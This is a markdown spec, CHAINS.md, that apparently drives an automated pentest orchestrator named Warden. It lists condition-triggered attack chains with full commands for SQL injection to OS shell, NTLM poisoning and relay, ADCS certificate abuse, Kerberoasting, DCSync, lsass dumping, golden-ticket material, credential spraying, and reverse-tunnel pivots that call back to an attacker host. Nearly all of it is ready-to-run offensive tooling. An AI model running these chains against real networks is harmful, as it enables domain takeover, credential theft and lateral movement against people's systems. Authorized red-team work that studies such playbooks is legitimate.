# CHAINS.md — Warden Attack Chains

Decision graph for the Warden orchestrator. Each chain is an ordered list of
`(condition) -> [suggested next tools/actions]`. Tool ids match `TOOLS.md`.
Conditions are boolean facts the engine tracks in state (artifacts produced by
prior tools). `->` means "when this becomes true, suggest these".

State-fact naming (generate an enum from these):

```
open_ports[], web_service, cms_wordpress, waf_present, hidden_params,
sqli_confirmed, rce_foothold, smb_open, smb_null_ok, nfs_export,
snmp_open, ldap_anon_ok, usernames[], valid_cred, is_local_admin,
asrep_hashes[], tgs_hashes[], ntlm_hashes[], cracked_pw[], dcsync_rights,
adcs_vulnerable[], bloodhound_path, machine_account, second_subnet, pivot_up
```

Cross-cutting rule applied before ANY Kerberos tool (GetNPUsers, GetUserSPNs,
getST/getTGT, certipy auth, secretsdump DCSync):
`kerberos_op -> [ntpdate {dc_ip}]` to avoid `KRB_AP_ERR_SKEW`.

---

## Chain A — External Web Foothold

| # | Condition | Suggested next tools |
|---|---|---|
| A1 | `open_ports` includes 80/443/8080/8443 | `httpx` (title/tech/status), `whatweb`, `wafw00f` |
| A2 | `waf_present` | throttle scanners (`-rl`/`--stable`), note evasion; do NOT run `nikto` loud |
| A3 | `web_service` confirmed | `nuclei -severity critical,high`, `katana` (crawl), `feroxbuster`/`ffuf` (dir-enum with `{wordlist}`) |
| A4 | tech = WordPress (`cms_wordpress`) | `wpscan -e vp,vt,u` → collect plugin CVEs + `usernames[]` |
| A5 | virtual-host hint (redirect to hostname / TLS SAN) | `ffuf` vhost mode (`-H "Host: FUZZ.{domain}"`), add discovered vhosts to scope |
| A6 | dynamic endpoints found by `katana`/dir-enum | `arjun` (find `hidden_params`) |
| A7 | `hidden_params` or forms present | `sqlmap` (`sqli_confirmed?`), manual injection testing |
| A8 | `sqli_confirmed` | `sqlmap --dump` creds → `usernames[]`+`cracked_pw[]`; try `--os-shell` for `rce_foothold` |
| A9 | version/product identified anywhere | `searchsploit {product} {version}` → known-exploit `rce_foothold` |
| A10 | `rce_foothold` (webshell/RCE) | upgrade shell, run `linpeas.sh` → privesc; harvest local creds → feed AD chains if domain-joined |
| A11 | creds found in web loot | reuse against `smb`/`winrm`/`ssh` via `nxc` (credential-reuse pivot) |

---

## Chain B — SMB Null Session

| # | Condition | Suggested next tools |
|---|---|---|
| B1 | `smb_open` (445) | `nxc smb {ip}` (banner/signing/domain), `enum4linux-ng -A {ip} -oJ` |
| B2 | signing shown disabled by nxc | record for `ntlmrelayx` target list (`--gen-relay-list`) |
| B3 | test null session | `nxc smb {ip} -u '' -p '' --shares`, `smbmap -H {ip} -u '' -p ''`, `rpcclient -U '' -N {ip}` |
| B4 | `smb_null_ok` (shares/READ) | `smbclient //{ip}/{share} -N` → download loot; `smbmap -R` recursive |
| B5 | RID cycling available | `enum4linux-ng -R` / `rpcclient -c 'enumdomusers'` → `usernames[]` |
| B6 | `usernames[]` collected, domain present | AS-REP roast without creds: `impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -format hashcat` → `asrep_hashes[]` |
| B7 | `asrep_hashes[]` | `hashcat -m 18200` with `{wordlist}` → `cracked_pw[]` → jump to Chain D |
| B8 | loot files contain creds/config | parse for passwords; reuse via `nxc` spray (`--continue-on-success`) |
| B9 | also check adjacent services | `showmount -e {ip}` (`nfs_export`), `snmpwalk -v2c -c public {ip}` (`snmp_open` → users/creds) |
| B10 | `nfs_export` world-readable / no_root_squash | `mount -t nfs`, loot / UID-spoof privesc |

---

## Chain C — AD From Zero Credentials

| # | Condition | Suggested next tools |
|---|---|---|
| C1 | `dc_ip` known, no creds | `ntpdate {dc_ip}`; `nxc smb {dc_ip}` (domain/FQDN), `ldapsearch -x -H ldap://{dc_ip} -s base namingcontexts` |
| C2 | `ldap_anon_ok` | `ldapsearch` anon dump, `windapsearch` anon → `usernames[]`, look at `description` fields for passwords |
| C3 | usernames from B5/C2/OSINT | `impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -format hashcat` → `asrep_hashes[]` |
| C4 | on-LAN (L2 adjacency) | `responder -I {iface} -w -d` → capture `NetNTLMv2` → `hashcat -m 5600` |
| C5 | signing disabled somewhere + poisoning | `responder` (SMB/HTTP off) + `impacket-ntlmrelayx -tf targets.txt -smb2support` → relayed SAM/`ntlm_hashes[]` |
| C6 | IPv6 in play | `mitm6 -d {domain}` + `impacket-ntlmrelayx -6 -t ldaps://{dc_ip} --delegate-access -wh fakewpad.{domain}` |
| C7 | can coerce a machine acct | `coercer coerce -t {ip} -l {attacker_ip}` / `petitpotam {attacker_ip} {dc_ip}` → relay to ADCS (ESC8) or LDAP |
| C8 | ADCS web-enroll reachable + coercion | `impacket-ntlmrelayx -t http://{ca_ip}/certsrv/certfnsh.asp --adcs --template DomainController` → DC cert → `certipy auth` → DC hash |
| C9 | any hash cracked → `valid_cred` | proceed to Chain D |

---

## Chain D — AD From One Valid Credential

| # | Condition | Suggested next tools |
|---|---|---|
| D1 | `valid_cred` (user:pass or user:nthash) | `ntpdate {dc_ip}`; `nxc smb {dc_ip} -u {user} -p {pass}` (confirm + look for `(Pwn3d!)`) |
| D2 | cred valid | `bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc_ip} -ns {dc_ip} -c All --zip` → `bloodhound_path` |
| D3 | cred valid | Kerberoast: `impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc_ip} -request -outputfile tgs.txt` → `tgs_hashes[]` |
| D4 | `tgs_hashes[]` | `hashcat -m 13100` (RC4) or `-m 19700` (AES) → `cracked_pw[]` (service accts, often high-priv) |
| D5 | cred valid | AS-REP roast whole domain: `impacket-GetNPUsers {domain}/{user}:{pass} -request -format hashcat` → `-m 18200` |
| D6 | cred valid | enumerate ADCS: `certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -vulnerable -stdout` → `adcs_vulnerable[]` |
| D7 | `adcs_vulnerable` = ESC1 | `certipy req ... -template {vuln} -upn administrator@{domain}` → pfx → `certipy auth -pfx` → DA hash |
| D8 | ESC8 / relay-based ESC | route through `ntlmrelayx --adcs` (see C8) |
| D9 | `bloodhound_path` shows delegation | constrained: `impacket-getST -spn cifs/{host} -impersonate administrator ...`; RBCD if `GenericWrite` on a computer |
| D10 | `bloodhound_path` shows GenericAll/WriteDACL over user | shadow creds: `certipy shadow auto -account {target}`; or reset pw via `nxc`/`bloodyAD` |
| D11 | `bloodhound_path` shows DCSync rights (`dcsync_rights`) | `impacket-secretsdump {domain}/{user}:{pass}@{dc_ip} -just-dc-ntlm` → all `ntlm_hashes[]` |
| D12 | any admin-capable cred/hash on a host (`is_local_admin`) | jump to Chain E |
| D13 | spray cracked pw across hosts | `nxc smb {targets} -u users.txt -p {pass} --continue-on-success` → find `(Pwn3d!)` |

---

## Chain E — AD From Local-Admin On A Member Host

| # | Condition | Suggested next tools |
|---|---|---|
| E1 | `is_local_admin` on `{ip}` (nxc shows `(Pwn3d!)`) | choose exec: `impacket-wmiexec` (stealth) / `smbexec` / `psexec` (`-hashes :{nthash}` for PtH) |
| E2 | admin, want local secrets | `impacket-secretsdump -hashes :{nthash} {domain}/{user}@{ip}` → local SAM `ntlm_hashes[]`, LSA, cached `DCC2` (`-m 2100`) |
| E3 | admin, live session | dump lsass: `lsassy -d {domain} -u {user} -H {nthash} {ip}` OR `nxc smb {ip} ... -M lsassy` → plaintext/NTLM |
| E4 | got lsass dump file | `pypykatz lsa minidump lsass.dmp --json` → `cred[]`, `tgt[]` |
| E5 | new higher-priv `ntlm_hashes[]`/`cracked_pw[]` | reuse: `nxc smb {domain_hosts} -u {user} -H {nthash}` → hunt Domain Admin sessions (BloodHound "where can I go") |
| E6 | DA hash or session token obtained | `impacket-secretsdump {domain}/{da}@{dc_ip} -just-dc` (full domain), grab `krbtgt` for golden ticket |
| E7 | machine has cached DA session | `mimikatz sekurlsa::logonpasswords` / token impersonation → escalate |
| E8 | domain-joined foothold, unknown targets | run `bloodhound-python` from this context if not done → `bloodhound_path` to DC |

---

## Chain F — Pivot Into A Second Subnet

| # | Condition | Suggested next tools |
|---|---|---|
| F1 | `rce_foothold`/shell on dual-homed host, `second_subnet` seen (`ip a`/`route`) | choose tunnel: **ligolo-ng** (preferred), chisel, sshuttle |
| F2 | ligolo path | attacker: `ip tuntap add user root mode tun ligolo` + `ip link set ligolo up` + `ligolo-proxy -selfcert`; victim: `./agent -connect {attacker_ip}:11601 -ignore-cert` |
| F3 | agent connected | proxy console `session` → `ip route add {second_subnet}/24 dev ligolo` → `start` → `pivot_up` |
| F4 | SSH creds to pivot instead | `sshuttle -r {user}@{ip} {second_subnet}/24 --dns -x {ip}` → `pivot_up` |
| F5 | only a web/RCE channel, no ligolo | `chisel server -p 8000 --reverse` (attacker) + `chisel client {attacker_ip}:8000 R:1080:socks` (victim) → `proxychains4` |
| F6 | `pivot_up` via SOCKS (chisel) | wrap tools: `proxychains4 nmap -sT -Pn ...`, `proxychains4 nxc smb ...` (no `-sS`/UDP through SOCKS) |
| F7 | `pivot_up` via ligolo/sshuttle (L3) | run tools natively against `second_subnet` (no proxychains needed) |
| F8 | subnet reachable | re-run discovery in new scope: `nmap`/`rustscan`/`naabu` → restart Chain A/B/C for the new segment |
| F9 | need reverse shells from inside | ligolo `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp` to relay callbacks back to attacker |
| F10 | double pivot (3rd subnet) | second agent + second tun interface (`ligolo2`), chain routes |

---

## Global fallbacks / reminders

- Before every Kerberos operation: `ntpdate {dc_ip}` (skew > 5 min = auth fails).
- `nxc == netexec == renamed crackmapexec (cme)` — prefer `nxc`.
- Cracker mode cheat: NTLM 1000 · NetNTLMv2 5600 · AS-REP 18200 · TGS-RC4 13100 · TGS-AES 19700 · DCC2 2100 · bcrypt 3200 · sha512crypt 1800.
- `(Pwn3d!)` in nxc output = local-admin ⇒ jump to Chain E.
- Any newly cracked/dumped credential re-enters the graph at C9/D1 and should be sprayed (`--continue-on-success`) across all known hosts.
- Relay chains need SMB signing **disabled** (SMB→SMB) or LDAP signing/channel-binding not enforced; disable Responder's SMB/HTTP servers when relaying.
